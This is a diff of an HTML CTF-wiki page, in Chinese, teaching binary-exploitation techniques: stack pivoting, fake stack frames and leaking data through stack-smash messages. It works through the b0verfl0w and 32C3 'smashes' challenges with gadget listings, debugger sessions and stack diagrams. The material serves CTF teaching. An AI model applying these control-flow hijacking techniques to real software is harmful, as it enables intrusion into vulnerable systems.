@@ -146,7 +146,7 @@
 <li class="toctree-l3"><a class="reference internal" href="#frame-faking">frame faking</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#id7">原理</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id8">例子</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id9">题目</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id9">题</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#stack-smash">Stack smash</a><ul>
@@ -238,7 +238,7 @@
 <h2>stack privot<a class="headerlink" href="#stack-privot" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id2">
 <h3>原理<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h3>
-<p>stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处。然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot</p>
+<p>stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot</p>
 <ul class="simple">
 <li>可以控制的栈溢出的字节数较少，难以构造较长的ROP链</li>
 <li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
@@ -249,24 +249,26 @@
 <li>可以控制程序执行流。</li>
 <li>可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是</li>
 </ul>
-<p><code class="docutils literal"><span class="pre">asm</span>&#160;&#160; <span class="pre">pop</span> <span class="pre">rsp/esp</span></code></p>
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span><span class="n">pop</span> <span class="n">rsp</span><span class="o">/</span><span class="n">esp</span>
+</pre></div>
+</div>
 <p>当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。</p>
-<dl class="docutils">
-<dt>gef➤  x/7i 0x000000000040061a</dt>
-<dd>0x40061a &lt;__libc_csu_init+90&gt;:    pop    rbx
-0x40061b &lt;__libc_csu_init+91&gt;:    pop    rbp
-0x40061c &lt;__libc_csu_init+92&gt;:    pop    r12
-0x40061e &lt;__libc_csu_init+94&gt;:    pop    r13
-0x400620 &lt;__libc_csu_init+96&gt;:    pop    r14
-0x400622 &lt;__libc_csu_init+98&gt;:    pop    r15
-0x400624 &lt;__libc_csu_init+100&gt;:    ret</dd>
-<dt>gef➤  x/7i 0x000000000040061d</dt>
-<dd>0x40061d &lt;__libc_csu_init+93&gt;:    pop    rsp
-0x40061e &lt;__libc_csu_init+94&gt;:    pop    r13
-0x400620 &lt;__libc_csu_init+96&gt;:    pop    r14
-0x400622 &lt;__libc_csu_init+98&gt;:    pop    r15
-0x400624 &lt;__libc_csu_init+100&gt;:   ret</dd>
-</dl>
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  x/7i 0x000000000040061a
+0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx
+0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp
+0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret
+gef➤  x/7i 0x000000000040061d
+0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret
+</pre></div>
+</div>
 <p>此外，还有更加高级的fake frame。</p>
 <ul class="simple">
 <li>存在可以控制内容的内存，一般有如下</li>
@@ -278,7 +280,7 @@
 <h3>示例<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h3>
 <div class="section" id="id4">
 <h4>例1<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
-<p>这里我们以 <strong>X-CTF Quals 2016 - b0verfl0w</strong> 为例，进行介绍。首先，查看程序的安全保护，如下</p>
+<p>这里我们以<strong>X-CTF Quals 2016 - b0verfl0w</strong>为例，进行介绍。首先，查看程序的安全保护，如下</p>
 <div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -312,7 +314,7 @@ privot。由于程序本身并没有开启堆栈保护，所以我们可以在�
 <li>控制eip指向shellcode处</li>
 </ul>
 <p>第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。</p>
-<div class="code asm highlight-default"><div class="highlight"><pre><span></span>➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39;
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39;
 Gadgets information
 ============================================================
 0x08048504 : jmp esp
@@ -382,11 +384,8 @@ Unique gadgets found: 3
 </div>
 <p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要接下后面两个部分</p>
 <ul class="simple">
-<li>函数的返回地址被我们覆盖为执行leave
-ret的地址，这就表明了函数在正常执行完自己的leave
-ret后，还会再次执行一次leave ret。</li>
-<li>其中fake
-ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
+<li>函数的返回地址被我们覆盖为执行leave ret的地址，这就表明了函数在正常执行完自己的leave ret后，还会再次执行一次leave ret。</li>
+<li>其中fake ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
 </ul>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">fake</span> <span class="n">ebp</span>
 <span class="o">|</span>
@@ -394,7 +393,7 @@ ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地�
 <span class="n">ebp2</span><span class="o">|</span><span class="n">target</span> <span class="n">function</span> <span class="n">addr</span><span class="o">|</span><span class="n">leave</span> <span class="n">ret</span> <span class="n">addr</span><span class="o">|</span><span class="n">arg1</span><span class="o">|</span><span class="n">arg2</span>
 </pre></div>
 </div>
-<p>这里我们的 fake ebp 指向 ebp2 ，即它为ebp2所在的地址。通常来说，这里都是我们能够控制的可读的内容。在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p>
+<p>这里我们的fake ebp指向ebp2，即它为ebp2所在的地址。通常来说，这里都是我们能够控制的可读的内容。在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p>
 <p>入口点</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">push</span> <span class="n">ebp</span>  <span class="c1"># 将ebp压栈</span>
 <span class="n">move</span> <span class="n">esp</span><span class="p">,</span> <span class="n">ebp</span> <span class="c1">#将esp的值赋给ebp</span>
@@ -411,51 +410,47 @@ ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地�
 </pre></div>
 </div>
 <p>下面我们来仔细说一下基本的控制过程。</p>
-<ol class="arabic">
-<li><p class="first">在有栈溢出的程序执行leave时，其分为两个步骤</p>
-<blockquote>
-<div><ul class="simple">
-<li>move ebp, esp ，这会将esp也指向当前栈溢出漏洞的ebp基地址处。</li>
-<li>pop ebp， 这会将栈中存放的fake
-ebp的值赋给ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了ebp2所在的地址。</li>
-</ul>
-</div></blockquote>
-</li>
-<li><p class="first">执行ret指令，会再次执行leave ret指令。</p>
-</li>
-<li><p class="first">执行leave指令，其分为两个步骤</p>
-<blockquote>
-<div><ul class="simple">
-<li>move ebp, esp ，这会将esp指向ebp2。</li>
-<li>pop ebp，此时，会将ebp的内容设置为ebp2的值，同时esp会指向target
-function。</li>
-</ul>
-</div></blockquote>
-</li>
-<li><p class="first">执行ret指令，这时候程序就会执行targetfunction，当其进行程序的时候会执行</p>
-<blockquote>
-<div><ul class="simple">
-<li>push ebp,会将ebp2值压入栈中，</li>
-<li>move esp, ebp，将ebp指向当前基地址。此时的栈结构为 <code class="docutils literal"><span class="pre">ebp</span>&#160; <span class="pre">|</span>&#160; <span class="pre">v</span>&#160; <span class="pre">ebp2|leave</span> <span class="pre">ret</span> <span class="pre">addr|arg1|arg2</span></code></li>
-</ul>
-</div></blockquote>
-</li>
-<li><p class="first">当程序执行师，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</p>
-</li>
-<li><p class="first">程序结束后，其又会执行两次 leave ret
-addr，所以如果我们在ebp2处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</p>
-</li>
+<ol class="arabic simple">
+<li>在有栈溢出的程序执行leave时，其分为两个步骤</li>
 </ol>
-<p>可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack
-privot相似。</p>
+<ul class="simple">
+<li>move ebp, esp ，这会将esp也指向当前栈溢出漏洞的ebp基地址处。</li>
+<li>pop ebp， 这会将栈中存放的fake ebp的值赋给ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了ebp2所在的地址。</li>
+</ul>
+<ol class="arabic simple" start="2">
+<li>执行ret指令，会再次执行leave ret指令。</li>
+<li>执行leave指令，其分为两个步骤</li>
+</ol>
+<ul class="simple">
+<li>move ebp, esp ，这会将esp指向ebp2。</li>
+<li>pop ebp，此时，会将ebp的内容设置为ebp2的值，同时esp会指向target function。</li>
+</ul>
+<ol class="arabic simple" start="4">
+<li>执行ret指令，这时候程序就会执行targetfunction，当其进行程序的时候会执行</li>
+</ol>
+<ul class="simple">
+<li>push ebp,会将ebp2值压入栈中，</li>
+<li>move esp, ebp，将ebp指向当前基地址。</li>
+</ul>
+<p>此时的栈结构如下</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ebp</span>
+<span class="o">|</span>
+<span class="n">v</span>
+<span class="n">ebp2</span><span class="o">|</span><span class="n">leave</span> <span class="n">ret</span> <span class="n">addr</span><span class="o">|</span><span class="n">arg1</span><span class="o">|</span><span class="n">arg2</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="5">
+<li>当程序执行师，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</li>
+<li>程序结束后，其又会执行两次 leave ret addr，所以如果我们在ebp2处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</li>
+</ol>
+<p>可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack privot相似。</p>
 </div>
 <div class="section" id="id8">
 <h3>例子<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
-<p>目前来说，我在exploit-exercise的fusion
-level2中利用过这个技巧，其它地方暂时还未遇到，遇到的时候再进行补充。</p>
+<p>目前来说，我在exploit-exercise的fusion level2中利用过这个技巧，其它地方暂时还未遇到，遇到的时候再进行补充。</p>
 </div>
 <div class="section" id="id9">
-<h3>题目<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
+<h3>题<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
 <p>参考阅读</p>
 <ul class="simple">
 <li><a class="reference external" href="http://www.xfocus.net/articles/200602/851.html">http://www.xfocus.net/articles/200602/851.html</a></li>
@@ -482,11 +477,11 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
 }
 </pre></div>
 </div>
-<p>所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在 __fortify_fail 函数中就会输出我们想要的信息。</p>
+<p>所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。</p>
 </div>
 <div class="section" id="id11">
 <h3>例子<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
-<p>这里，我们以2015年32C3 CTF smashes为例进行介绍，该题目在 jarvisoj 上有复现。</p>
+<p>这里，我们以2015年32C3 CTF smashes为例进行介绍，该题目在jarvisoj上有复现。</p>
 <div class="section" id="id12">
 <h4>确定保护<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
 <p>可以看出程序为64位，主要开启了Canary保护以及NX保护，以及FORTIFY保护。</p>
@@ -537,7 +532,7 @@ LABEL_8:
 }
 </pre></div>
 </div>
-<p>很显然，程序在 _IO_gets((__int64)&amp;v4); 存在栈溢出。</p>
+<p>很显然，程序在_IO_gets((__int64)&amp;v4);存在栈溢出。</p>
 <p>此外，程序中还提示要overwrite flag。而且发现程序很有意思的在while循环之后执行了这条语句</p>
 <div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">memset</span><span class="p">((</span><span class="n">void</span> <span class="o">*</span><span class="p">)((</span><span class="n">signed</span> <span class="nb">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20</span><span class="n">LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
 </pre></div>
@@ -547,7 +542,7 @@ LABEL_8:
 <span class="o">.</span><span class="n">data</span><span class="p">:</span><span class="mi">0000000000600</span><span class="n">D20</span> <span class="n">aPctfHereSTheFl</span> <span class="n">db</span> <span class="s1">&#39;PCTF{Here&#39;</span><span class="p">,</span><span class="mi">27</span><span class="n">h</span><span class="p">,</span><span class="s1">&#39;s the flag on server}&#39;</span><span class="p">,</span><span class="mi">0</span>
 </pre></div>
 </div>
-<p>但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 <code class="docutils literal"><span class="pre">byte_600D20[v1++]</span> <span class="pre">=</span> <span class="pre">v2;</span></code> 也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了</p>
+<p>但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容<code class="docutils literal"><span class="pre">byte_600D20[v1++]</span> <span class="pre">=</span> <span class="pre">v2;</span></code>也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了</p>
 <ul class="simple">
 <li>在EFL内存映射时，bss段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用gdb的find来进行查找。</li>
 </ul>
@@ -555,7 +550,7 @@ LABEL_8:
 <div class="section" id="flag">
 <h4>确定flag地址<a class="headerlink" href="#flag" title="永久链接至标题">¶</a></h4>
 <p>我们把断点下载memset函数处，然后读取相应的内容如下</p>
-<div class="code shell highlight-default"><div class="highlight"><pre><span></span>gef➤  c
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  c
 Continuing.
 Hello!
 What&#39;s your name? qqqqqqq
@@ -609,7 +604,7 @@ gef➤  grep PCTF
 <h4>确定偏移<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h4>
 <p>下面，我们确定argv[0]距离读取的字符串的偏移。</p>
 <p>首先下断点在main函数入口处，如下</p>
-<div class="code shell highlight-default"><div class="highlight"><pre><span></span>gef➤  b *0x00000000004006D0
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  b *0x00000000004006D0
 Breakpoint 1 at 0x4006d0
 gef➤  r
 Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes
@@ -656,7 +651,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 <span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">000000000040080</span><span class="n">E</span>                 <span class="n">call</span>    <span class="n">__IO_gets</span>
 </pre></div>
 </div>
-<p>我们可以确定我们读入的字符串的起始地址其实就是调用 __IO_gets 之前的rsp，所以我们把断点下在call处，如下</p>
+<p>我们可以确定我们读入的字符串的起始地址其实就是调用__IO_gets之前的rsp，所以我们把断点下在call处，如下</p>
 <div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  b *0x000000000040080E
 Breakpoint 2 at 0x40080e
 gef➤  c
